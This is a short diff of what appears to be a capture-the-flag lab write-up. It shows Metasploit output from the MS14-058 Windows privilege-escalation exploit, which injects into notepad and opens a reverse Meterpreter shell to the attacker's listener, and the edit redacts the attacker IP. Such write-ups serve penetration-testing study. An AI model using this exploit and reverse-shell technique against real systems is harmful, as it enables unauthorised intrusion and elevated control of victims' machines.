@@ -279,7 +279,7 @@ meterpreter > background
 [*] Backgrounding session 1...
 msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
 
-[*] Started reverse TCP handler on 10.10.14.15:5555 
+[*] Started reverse TCP handler on 10.10.x.x:5555 
 [*] Launching notepad to host the exploit...
 [+] Process 3060 launched.
 [*] Reflectively injecting the exploit DLL into 3060...
@@ -288,7 +288,7 @@ msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
 [*] Payload injected. Executing exploit...
 [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
 [*] Sending stage (176195 bytes) to 10.10.10.14
-[*] Meterpreter session 2 opened (10.10.14.15:5555 -> 10.10.10.14:1032) at 2021-01-26 19:47:34 +0800
+[*] Meterpreter session 2 opened (10.10.x.x:5555 -> 10.10.10.14:1032) at 2021-01-26 19:47:34 +0800
 
 meterpreter > 
 ```
